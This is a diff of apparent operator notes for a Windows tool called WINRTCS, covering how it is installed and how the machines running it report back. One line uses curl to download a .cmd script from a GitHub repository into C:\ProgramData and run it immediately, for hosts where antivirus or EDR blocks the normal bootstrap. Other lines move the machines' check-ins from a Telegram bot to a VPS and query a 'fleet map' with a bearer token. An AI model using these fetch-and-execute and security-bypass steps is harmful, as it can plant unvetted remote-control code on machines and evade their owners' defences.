@@ -14,6 +14,7 @@ WINRTCS minimal installer (hosts where AV/EDR blocks the full bootstrap — Acce
 
 curl.exe -L --ssl-no-revoke -o C:\ProgramData\wq.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_quick.cmd && C:\ProgramData\wq.cmd
 
-WINRTCS digest seed (optional per-machine Telegram override; the repo winrtcs_digest.cfg is the fleet default). Paste YOUR dedicated bot token:
+WINRTCS digest: RETIRED (C20) - machines report to the VPS, the VPS holds the bot token.
+Query the live fleet map (token in your local keepass / Desktop fetch_token.txt):
 
-(echo BOT_TOKEN=PASTE_TOKEN_HERE& echo CHAT_ID=7547462070)>C:\ProgramData\WinRTCS\notify.cfg
+curl.exe -s -H "Authorization: Bearer PASTE_FETCH_TOKEN_HERE" https://debian.seczio.com/map
